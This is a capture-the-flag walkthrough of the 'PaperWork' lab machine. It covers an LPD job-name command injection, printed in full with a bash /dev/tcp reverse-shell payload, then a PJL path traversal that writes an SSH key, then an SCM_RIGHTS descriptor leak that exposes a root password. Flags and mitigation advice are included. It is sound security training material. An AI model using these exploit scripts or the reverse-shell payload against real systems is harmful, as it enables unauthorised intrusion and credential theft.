# PaperWork Machine Walkthrough


# 1. Reconnaissance

The first step was to determine which network services were exposed by the target.

```bash
kali@kali:~$ nmap -Pn -p- --min-rate 5000 10.129.45.131
```

### Result

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-11 18:40 -0400
Nmap scan report for 10.129.45.131
Host is up (0.69s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1515/tcp open  ifor-protocol
```

Three interesting ports were exposed:

| Port | Service | Significance |
|---|---|---|
| 22 | SSH | Possible remote login service |
| 80 | HTTP | Web application to enumerate |
| 1515 | Unknown/custom service | Potentially important because it is not a standard web service |

A more detailed scan was then performed.

```bash
kali@kali:~$ nmap -sV -sC -p22,80,1515 10.129.45.131
```

### Result

```text
PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http           nginx 1.28.0 (Ubuntu)
|_http-title: Did not follow redirect to http://paperwork.htb/
|_http-server-header: nginx/1.28.0 (Ubuntu)
1515/tcp open  ifor-protocol?
| fingerprint-strings:
|   TerminalServer, TerminalServerCookie:
|_    Archive_Printer is ready and printing.
```

### What did this tell us?

The HTTP service redirected to:

```text
http://paperwork.htb/
```

The response from port `1515` was particularly interesting:

```text
Archive_Printer is ready and printing.
```

This suggested that port `1515` was related to printing.

The web application also appeared to describe a print workflow. This made the custom print service worth investigating.

The hostname was therefore added locally:

```bash
kali@kali:~$ echo "10.129.45.131 paperwork.htb" | sudo tee -a /etc/hosts
```

### Key finding

The initial reconnaissance identified:

- A normal SSH service.
- A web application on port `80`.
- A custom print-related service on port `1515`.
- A hostname of `paperwork.htb`.

The unusual print service became the main area of investigation.

---

# 2. Web Enumeration

Opening the web application revealed information about the intended print workflow:

```text
Protocol: Compliance Level: RFC 1179
Target Queue: archive_intake
Internal Processor: paperwork-archive-v1.02
```

RFC 1179 is associated with the Line Printer Daemon protocol, commonly called LPD.

The page also exposed the name of an internal processor:

```text
paperwork-archive-v1.02
```

More importantly, the application provided a way to download the internal processor.

```bash
kali@kali:~$ curl -s http://paperwork.htb/download/archive -o archive.zip
kali@kali:~$ unzip archive.zip
```

The archive contained:

```text
server.py
```

Reviewing the source code was important because the application was processing data received through the print protocol.

The vulnerable line was:

```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

The important details are:

- `job_name` is controlled through the LPD request.
- The value is inserted directly into a command string.
- `shell=True` tells Python to execute the constructed string through a shell.
- No appropriate shell escaping or input validation is performed.

### Why is this dangerous?

Normally, a program might intend to execute something equivalent to:

```bash
echo 'Archive: report'
```

If `job_name` contains shell metacharacters, however, the shell does not necessarily treat the entire value as ordinary text.

Characters such as:

```text
;
&
|
$
```

can have special meanings to a shell.

For example, conceptually, if untrusted data becomes part of:

```bash
echo 'Archive: USER_INPUT'
```

and the input is able to terminate the quoted portion and introduce another shell command, the resulting command can execute something other than the developer intended.

This is known as **OS command injection**.

### How we recognized the vulnerability

The important reasoning was:

1. We found a custom print service.
2. We obtained its processing code.
3. We saw that an externally supplied LPD field became `job_name`.
4. That value was inserted into a command string.
5. The command was executed with `shell=True`.
6. There was no visible sanitization or safe argument handling.

Therefore, the LPD job name was an OS command injection point.

---

# 3. LPD Command Injection

The next step was to construct an LPD request that supplied a malicious job name.

The exploit script was:

```python
#!/usr/bin/env python3
import socket
import sys

TARGET = "paperwork.htb"
PORT = 1515
QUEUE = "archive_intake"

def exploit(payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((TARGET, PORT))

    s.send(b"\x02" + QUEUE.encode() + b"\n")

    job_num = 666
    hostname = "kali"
    cf_name = f"cfA{job_num:03d}{hostname}"

    control = (
        f"H{hostname}\n"
        f"Pkali\n"
        f"J{payload}\n"
        f"l{hostname}\n"
        f"Ntest.txt\n"
    ).encode()

    s.send(b"\x02" + str(len(control)).encode() + b" " + cf_name.encode() + b"\n")
    s.recv(1024)
    s.send(control + b"\x00")
    s.close()

if __name__ == "__main__":
    lhost = sys.argv[1]
    lport = sys.argv[2]
    payload = f"' ;bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' ;'"
    exploit(payload)
```


### Imports

```python
import socket
import sys
```

`socket` is used to communicate directly with the LPD service.

`sys` is used to obtain the listener address and port from the command line.

### Target information

```python
TARGET = "paperwork.htb"
PORT = 1515
QUEUE = "archive_intake"
```

- Target hostname.
- Target port.
- LPD print queue.

### Creating the connection

```python
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)
s.connect((TARGET, PORT))
```

This creates a TCP socket and connects to port `1515`.

### Selecting the print queue

```python
s.send(b"\x02" + QUEUE.encode() + b"\n")
```

The script sends the LPD protocol request that identifies the queue:

```text
archive_intake
```

### Building the control file

```python
control = (
    f"H{hostname}\n"
    f"Pkali\n"
    f"J{payload}\n"
    f"l{hostname}\n"
    f"Ntest.txt\n"
).encode()
```

The important line is:

```python
f"J{payload}\n"
```

The `J` field represents the job name.

This is significant because the server code previously showed:

```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

So the data supplied through the `J` field eventually becomes the value of `job_name`.

### The reverse-shell payload

```python
payload = f"' ;bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' ;'"
```

The payload attempts to break out of the intended quoted string and execute a new shell command.

The important portion is:

```bash
bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
```

This starts an interactive Bash shell and redirects its input and output through a TCP connection to the attacker's listener.

The result is a reverse shell.

---

## Starting the listener

Before triggering the vulnerability, a listener was started:

```bash
kali@kali:~$ nc -lnvp 4444
```

Then the exploit was executed:

```bash
kali@kali:~$ python3 exploit.py 10.10.14.133 4444
```

The resulting connection was:

```text
kali@kali:~$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.133] from (UNKNOWN) [10.129.45.167] 52330
bash: cannot set terminal process group (990): Inappropriate ioctl for device
bash: no job control in this shell
lp@paperwork:/opt/LPDServer$
```

### What did we gain?

We obtained a shell as:

```text
lp
```

This was not root.


###  summary

**Vulnerability:** OS command injection.

**cause:** User-controlled LPD job data was inserted directly into a shell command.

**code:**

```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```
---

# 4. Internal Service Enumeration

Once the `lp` shell was obtained, the next step was to enumerate services that were not necessarily accessible externally.

```bash
lp@paperwork:/opt/LPDServer$ ss -ltnp
```

### Result

```text
State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process
LISTEN 0      100        0.0.0.0:1515      0.0.0.0:*    users:(("python3",pid=992,fd=3))
LISTEN 0      100        127.0.0.1:9100      0.0.0.0:*
LISTEN 0      128        127.0.0.1:1337      0.0.0.0:*
LISTEN 0      511        0.0.0.0:80        0.0.0.0:*
LISTEN 0      4096       0.0.0.0:22        0.0.0.0:*
```

Two services stood out:

```text
127.0.0.1:9100
127.0.0.1:1337
```

These services were bound to `127.0.0.1`.

That means they were listening only on the machine's loopback interface and were not directly exposed to external hosts.

This is an important post-exploitation technique:

> After obtaining a foothold, enumerate localhost services because they may contain functionality that is unavailable from the network.

The process list was then inspected.

```bash
lp@paperwork:/opt/LPDServer$ ps auxww | grep -Ei '9100|printer|archive|jet|paper' | grep -v grep
```

### Result

```text
archivist  991  0.0  0.4  28040 17560 ?  Ss  /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
root      1496  0.0  0.4  28432 17968 ?  Ss  /usr/bin/python3 /usr/bin/paperwork-daemon
```

This revealed an important relationship:

```text
jetdirect.py
```

was running as:

```text
archivist
```

and its printer filesystem root was:

```text
/home/archivist/printer/
```
---

# 5. To Archivist



An SSH key pair was generated locally.

```bash
kali@kali:~$ ssh-keygen -t ed25519 -f ~/paperwork_archivist -N ''
kali@kali:~$ cat ~/paperwork_archivist.pub
```

The public key was:

```text
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBV4o7F3CsmOg1hMEcqa/tPKYE52mIGg0IrXRI2mY3Ep kali@kali
```

The important observation from the JetDirect process was that its root directory was:

```text
/home/archivist/printer/
```

If the printer service accepted a filename such as:

```text
../.ssh/authorized_keys
```

the operating system would resolve the path relative to:

```text
/home/archivist/printer/
```

giving:

```text
/home/archivist/.ssh/authorized_keys
```

This would place the attacker's public key in the SSH authorization file of `archivist`.

The following script was used:

```bash
lp@paperwork:/opt/LPDServer$ python3 - <<'PY'
import socket

pub = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBV4o7F3CsmOg1hMEcqa/tPKYE52mIGg0IrXRI2mY3Ep kali@kali\n"

payload = (
    b'\x1b%-12345X@PJL\r\n'
    + f'@PJL FSDOWNLOAD NAME="../.ssh/authorized_keys" SIZE={len(pub)}\r\n'.encode()
    + pub
    + b'\x1b%-12345X\r\n'
)

s = socket.create_connection(("127.0.0.1", 9100), timeout=2)
s.sendall(payload)
s.close()
PY
```

### Important parts

The payload begins with PJL printer commands:

```text
@PJL
```

The relevant command is:

```text
@PJL FSDOWNLOAD NAME="../.ssh/authorized_keys" SIZE=...
```

`FSDOWNLOAD` is being used as a file-writing mechanism.

The crucial filename is:

```text
../.ssh/authorized_keys
```

The `..` component moves one directory above:

```text
/home/archivist/printer/
```

which reaches:

```text
/home/archivist/
```

and then `.ssh/authorized_keys` is selected.

Because the service was running as `archivist`, the file was written with the privileges of that account.

SSH access was then obtained with:

```bash
kali@kali:~$ ssh -i ~/paperwork_archivist -o IdentitiesOnly=yes archivist@10.129.45.167
```

The user flag was then available:

```bash
archivist@paperwork:~$ cat user.txt
54383c66edea58740474769f7f842dd0
```

---

# 6. Understanding the Path Traversal Vulnerability

The exact vulnerability became clearer after reviewing the JetDirect source code.

```bash
archivist@paperwork:~$ cat /home/archivist/printer/jetdirect.py
```

The relevant code was:

```python
class Filesystem:
    def __init__(self, root_dir):
        self._root = os.path.abspath(root_dir)

    def _translate(self, path):
        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
        return os.path.normpath(os.path.join(self._root, clean))

    def write(self, path, data):
        target = self._translate(path)
        try:
            os.makedirs(os.path.dirname(target), exist_ok=True)
            with open(target, "wb") as f: f.write(data)
            return "OK"
        except: return "FILEERROR=1"
```

At first glance, the code appears to clean the supplied path.

It calls:

```python
os.path.normpath()
```

This normalizes paths such as:

```text
printer/../file
```

into:

```text
file
```

However, normalization is not the same as security validation.

The code never checks whether the resulting path is still inside:

```text
/home/archivist/printer/
```

For example:

```text
root = /home/archivist/printer
path = ../.ssh/authorized_keys
```

After joining and normalizing, the result becomes:

```text
/home/archivist/.ssh/authorized_keys
```

That is outside the intended printer directory.


The intended security was:

```text
/home/archivist/printer/
```

The application was supposed to restrict file operations to that directory.

However, the application trusted a user-controlled path.

The attacker supplied:

```text
../
```

to escape the intended directory.

 **path traversal**

---

# 7. Why the SSH Key Worked

The path traversal by itself did not automatically provide an SSH shell.

The important part was choosing a file that could turn the arbitrary file write into authentication access.

SSH commonly checks:

```text
~/.ssh/authorized_keys
```

for public keys that are allowed to authenticate to an account.

The target account was:

```text
archivist
```

and its home directory was:

```text
/home/archivist/
```

The intended printer directory was:

```text
/home/archivist/printer/
```

Therefore:

```text
../.ssh/authorized_keys
```

resolved to:

```text
/home/archivist/.ssh/authorized_keys
```

The attacker's public key was written there.

The corresponding private key remained on Kali:

```text
~/paperwork_archivist
```

SSH then used the private key to authenticate as the user whose `authorized_keys` file contained the matching public key.

This changed the level of access from:

```text
lp
```

to:

```text
archivist
```

---

# 8. Privilege Escalation Enumeration

After obtaining an SSH shell as `archivist`, the next goal was to find a way to become root.

The root daemon was inspected:

```bash
archivist@paperwork:~$ cat /usr/bin/paperwork-daemon
```

The important code was:

```python
admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
LOG_PATH = "/home/archivist/printer/logs/commands.log"

def scan_for_malice():
    if not os.path.exists(LOG_PATH):
        return False
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False

def trigger_lockdown(conn):
    log_fd = os.open(LOG_PATH, os.O_RDONLY)
    evidence_bundle = array.array("i", [log_fd, admin_fd])
    msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
```

There are several important details here.

## Root opens the password file

```python
admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
```

The daemon runs as root.

Therefore this file descriptor represents a file that the `archivist` user would normally not be able to read directly.

The descriptor remains open inside the daemon.

## The daemon watches the printer log

```python
LOG_PATH = "/home/archivist/printer/logs/commands.log"
```

The daemon examines this log for specific strings.

```python
if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
    return True
```

If one of these strings appears, the daemon considers it a malicious event.

## The critical mistake

The daemon then does:

```python
log_fd = os.open(LOG_PATH, os.O_RDONLY)
```

and creates an array containing:

```python
[log_fd, admin_fd]
```

The important part is:

```python
conn.sendmsg(
    [msg],
    [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)]
)
```

`SCM_RIGHTS` is a Unix socket mechanism that allows one process to pass open file descriptors to another process.

This is a legitimate operating system feature.

The vulnerability is the way it is being used here.

The root daemon passes:

```text
log_fd
admin_fd
```

to the client connected to the management socket.

The second descriptor points to:

```text
/etc/paperwork/admin_pins.conf
```

which is a privileged file.

---

# 9. Unix Socket Access

The management socket configuration was:

```python
socket_path = "/run/paperwork/mgmt.sock"
os.chmod(socket_path, 0o660)
os.chown(socket_path, 0, 1000)
```

The socket permissions were:

```text
0660
```

This allows the owner and group to access the socket.

The important point is that the socket was reachable by the lower-privileged user involved in the attack.

This meant `archivist` could communicate with the root daemon.

### Why this matters

A Unix socket is a local inter-process communication mechanism.

Unlike a normal TCP connection, it can also be used for operating-system-level features such as passing file descriptors.

The key issue was not simply that `archivist` could connect to the socket.

The serious problem was that the root daemon trusted the connected client enough to pass it an already-open privileged file descriptor.

---

# 10. Triggering the File Descriptor Leak

The daemon's scanner looked for:

```text
FSQUERY
FSUPLOAD
FSDOWNLOAD
```

in:

```text
/home/archivist/printer/logs/commands.log
```

Therefore the scanner could be triggered by adding one of those strings:

```bash
archivist@paperwork:~$ printf 'FSQUERY trigger\n' >> /home/archivist/printer/logs/commands.log
```

The string:

```text
FSQUERY
```

was enough to satisfy the scanner.

The daemon would then execute the `trigger_lockdown()` logic.

---

# 11. Receiving the Passed File Descriptors

A Python script was used to connect to the Unix socket and receive the descriptors.

```bash
archivist@paperwork:~$ python3 - <<'PY'
import socket, os, array, re

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")

fds = array.array("i")
msg, anc, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(8))
print(msg.decode("latin-1", "replace"))

for level, typ, data in anc:
    if level == socket.SOL_SOCKET and typ == socket.SCM_RIGHTS:
        fds.frombytes(data[:len(data) - (len(data) % fds.itemsize)])

for i, fd in enumerate(fds):
    data = os.pread(fd, 4096, 0).decode("latin-1", "replace")
    print(f"\n--- FD {i} ---")
    print(data)
    m = re.search(r"ADMIN_PASSWORD=(.+)", data)
    if m:
        print("\nROOT PASSWORD:", m.group(1).strip())
PY
```

## Important parts of the script

### Connect to the Unix socket

```python
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")
```

This creates a Unix-domain socket instead of a normal TCP socket.

The script connects to:

```text
/run/paperwork/mgmt.sock
```

### Receive ancillary data

```python
msg, anc, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(8))
```

`recvmsg()` is important because Unix sockets can send additional control information along with normal message data.

The file descriptors are carried as ancillary data.

### Extract `SCM_RIGHTS`

```python
for level, typ, data in anc:
    if level == socket.SOL_SOCKET and typ == socket.SCM_RIGHTS:
```

This checks for the Unix socket control mechanism used for file descriptor passing.

The received data is converted into integer file descriptors:

```python
fds.frombytes(
    data[:len(data) - (len(data) % fds.itemsize)]
)
```

### Read the descriptors

```python
for i, fd in enumerate(fds):
    data = os.pread(fd, 4096, 0).decode("latin-1", "replace")
```

`os.pread()` reads from the already-open file descriptor.

This is the crucial security concept.

The process does not need to open:

```text
/etc/paperwork/admin_pins.conf
```

itself.

Instead, the root process already opened the file and passed the open descriptor to it.

Therefore the original filesystem permission check that would normally prevent `archivist` from opening the file is no longer relevant to the already-open descriptor.

---

# 12. The Leaked Password

The output was:

```text
ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.

--- FD 0 ---
<commands.log content>
FSQUERY trigger

--- FD 1 ---
ADMIN_PASSWORD=ApparelMortuaryCedar22

ROOT PASSWORD: ApparelMortuaryCedar22
```

The second descriptor contained:

```text
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

This provided a password that could be used to switch to root.

### Why this was a privilege escalation vulnerability

The important chain was:

1. The daemon runs as root.
2. Root opens a sensitive file.
3. A lower-privileged user can reach the management socket.
4. A trigger causes the daemon to send file descriptors to the client.
5. One descriptor points to the sensitive file.
6. The lower-privileged process can read the descriptor.
7. The contents of the root-readable file become available to the lower-privileged user.

The underlying vulnerability is **unsafe privileged file descriptor passing**.

---

# 13. Root Access

The leaked password was then used:

```bash
archivist@paperwork:~$ su -
Password: ApparelMortuaryCedar22
```

A root shell was obtained.

The root flag was read with:

```bash
root@paperwork:~# cat root.txt
342cf689341282160e8357ec49408804
```

---

# 14. Vulnerability Breakdown

## 14.1 LPD Command Injection

### What is it?

Command injection occurs when an application places attacker-controlled input into a command that is executed by the operating system shell.

### Where was it?

```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

### Why was it vulnerable?

`job_name` came from the LPD control file and was not safely handled.

The application trusted the value and placed it inside a shell command.

### What did we gain?

A reverse shell as:

```text
lp
```

---

## 14.2 Path Traversal

### What is it?

Path traversal occurs when an application allows a user-controlled path to escape an intended directory using components such as:

```text
../
```

### Where was it?

```python
return os.path.normpath(os.path.join(self._root, clean))
```

### Why was it vulnerable?

The application normalized the path but did not verify that the final path remained under:

```text
/home/archivist/printer/
```

### What did we gain?

The ability to write files outside the printer directory.

---

## 14.3 Arbitrary File Write

### What is it?

An arbitrary file write vulnerability allows an attacker to choose a file path and control the contents written to that file.

### Where was it?

```python
with open(target, "wb") as f:
    f.write(data)
```

### Why was it dangerous?

The target path was attacker-controlled and the service ran as:

```text
archivist
```

This meant the attacker could write files with `archivist`'s permissions.

### What did we use it for?

We wrote an SSH public key to:

```text
/home/archivist/.ssh/authorized_keys
```

### Result

SSH access as:

```text
archivist
```

---

## 14.4 Unsafe File Descriptor Passing

### What is it?

Unix systems allow processes to pass already-open file descriptors through Unix sockets using mechanisms such as:

```text
SCM_RIGHTS
```

This can be useful for legitimate inter-process communication.

It becomes dangerous when a privileged process passes descriptors for sensitive files to an unprivileged process.

### Where was it?

```python
evidence_bundle = array.array("i", [log_fd, admin_fd])

conn.sendmsg(
    [msg],
    [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)]
)
```

### Why was it vulnerable?

`admin_fd` represented:

```text
/etc/paperwork/admin_pins.conf
```

and had been opened by the root daemon.

The descriptor was then sent to the socket client.

### What did we gain?

The contents of the privileged configuration file, including:

```text
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

### Result

The password allowed:

```bash
su -
```

and root access.

---

## 14.5 Sensitive Secret Reuse

The final issue was that the administrator password stored in:

```text
/etc/paperwork/admin_pins.conf
```

was reusable for:

```text
root
```

This meant obtaining the password was sufficient to authenticate as root.

A privileged daemon should avoid exposing reusable root credentials to lower-privileged processes.

---

# 15. Why Each Stage Was Necessary

| Stage | Vulnerability / Technique | Access gained |
|---|---|---|
| Port scan | Network enumeration | Identified exposed services |
| Source download | Application analysis | Found vulnerable LPD processing |
| LPD `J` field | Command injection | Shell as `lp` |
| `ss -ltnp` | Internal enumeration | Found localhost printer service |
| Process enumeration | Service identification | Found JetDirect running as `archivist` |
| PJL `FSDOWNLOAD` | Path traversal | Escaped printer directory |
| SSH key write | Arbitrary file write | SSH as `archivist` |
| Daemon source review | Privilege escalation analysis | Found FD-passing flaw |
| `FSQUERY` trigger | Application logic abuse | Triggered root daemon |
| `SCM_RIGHTS` | Unsafe FD passing | Read privileged configuration |
| Password reuse | Credential-based escalation | Root shell |

---

# 16. Credentials and Access Summary

| Account | Credential / Access | How it was obtained |
|---|---|---|
| `lp` | Reverse shell | LPD command injection |
| `archivist` | `~/paperwork_archivist` SSH key | PJL path traversal and arbitrary file write |
| `root` | `ApparelMortuaryCedar22` | Privileged file descriptor leak |

---

# 17. Flags

## User Flag

Location:

```text
/home/archivist/user.txt
```

Obtained after obtaining SSH access as `archivist`.

```text
54383c66edea58740474769f7f842dd0
```

## Root Flag

Location:

```text
/root/root.txt
```

Obtained after escalating to root.

```text
342cf689341282160e8357ec49408804
```

---

# 18. Final Attack Chain

The complete compromise can be represented as a sequence of stages:

```text
Nmap enumeration
|
|  Port 1515 identified as a print service
|
v
LPD source code review
|
|  job_name reaches shell=True
|
v
LPD command injection
|
|  Reverse shell
|
v
lp user
|
|  Enumerate localhost services
|
v
JetDirect service on 127.0.0.1:9100
|
|  Service runs as archivist
|
v
PJL FSDOWNLOAD path traversal
|
|  ../.ssh/authorized_keys
|
v
SSH public key written for archivist
|
v
SSH as archivist
|
|  Inspect root paperwork-daemon
|
v
Unix socket FD passing
|
|  Trigger scanner with FSQUERY
|
v
SCM_RIGHTS file descriptor leak
|
|  Receive FD for admin_pins.conf
|
v
Read ADMIN_PASSWORD
|
v
su -
|
v
root
```

---

# 19. Mitigation Recommendations

## Prevent command injection

Avoid constructing shell commands from untrusted input.

Instead of:

```python
subprocess.Popen(
    f"echo 'Archive: {job_name}' >> /tmp/archive.log",
    shell=True
)
```

applications should avoid `shell=True` where it is unnecessary and pass arguments separately.

Input should also be validated according to the expected LPD field format.

---

## Validate LPD metadata

Fields such as the job name should have strict validation.

For example, if only ordinary filenames are expected, characters with shell significance should not be accepted.

Validation should happen before the value reaches any command execution or filesystem operation.

---

## Properly constrain filesystem paths

Normalizing a path is not enough.

After resolving a requested path, the application should verify that the resulting path remains inside the intended directory.

The security check should conceptually enforce:

```text
/home/archivist/printer/<requested file>
```

without allowing the final path to escape that directory.

---

## Protect internal services

A service listening only on:

```text
127.0.0.1
```

should not automatically be considered safe.

After an attacker obtains any shell on the machine, localhost-only services can become accessible.

Internal services should therefore have their own authentication and authorization controls.

---

## Secure Unix socket permissions

The management socket should only be accessible to processes that genuinely require administrative functionality.

Group membership alone should not provide access to sensitive management operations.

---

## Do not pass privileged file descriptors unnecessarily

The root daemon should not pass descriptors for sensitive files to untrusted clients.

If file descriptor passing is required, the daemon should ensure that the recipient is authorized to receive each descriptor.

---

## Do not store reusable root credentials in daemon-readable files

The password:

```text
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

created a direct path from information disclosure to root authentication.

Sensitive administrative credentials should not be stored as reusable plaintext passwords in files accessible to long-running privileged processes.

---

# 20. Interview-Level Explanation

If asked to explain the machine during an interview, the attack can be summarized as follows:

> The initial enumeration revealed SSH, HTTP, and a custom print service on port 1515. The web application exposed the LPD workflow and allowed the internal processor to be downloaded. Reviewing its source code showed that the LPD job name was inserted directly into a shell command using `shell=True`, which created an OS command injection vulnerability. I used the LPD `J` field to trigger a reverse shell and obtained access as the `lp` user.
>
> From that foothold, I enumerated listening services and found a JetDirect-like printer service on `127.0.0.1:9100` running as `archivist`. Reviewing its source showed that `FSDOWNLOAD` accepted a user-controlled path and normalized it without checking whether the resulting path remained inside the printer directory. This allowed directory traversal using `../`.
>
> I used the resulting arbitrary file-write capability to place my SSH public key into `/home/archivist/.ssh/authorized_keys`, which allowed me to authenticate as `archivist`.
>
> As `archivist`, I reviewed the root `paperwork-daemon` and found that it opened `/etc/paperwork/admin_pins.conf` and later passed that file descriptor to clients through a Unix socket using `SCM_RIGHTS`. The socket was accessible to the lower-privileged account, and the daemon could be triggered by placing `FSQUERY` in the printer log. I connected to the socket, received the file descriptor, and read the administrator password from the already-open file. Since the password was reusable for root, I used `su` to obtain root access.

---

# 21. Main Lessons

The machine demonstrates several important security concepts:

1. **User-controlled data must never be blindly placed into shell commands.**
2. **`shell=True` can turn an input-handling bug into command execution.**
3. **A localhost-only service can become an attack surface after an initial foothold.**
4. **Path normalization does not automatically prevent path traversal.**
5. **Arbitrary file write vulnerabilities can become authentication attacks when sensitive files are writable.**
6. **SSH `authorized_keys` is an important file to understand during Linux security assessments.**
7. **Unix domain sockets provide powerful local IPC capabilities and must be protected carefully.**
8. **`SCM_RIGHTS` can transfer an already-open file descriptor between processes.**
9. **File permissions do not protect a file descriptor after another process has already opened and transferred it.**
10. **A leaked reusable administrative password can turn an information disclosure into complete privilege escalation.**
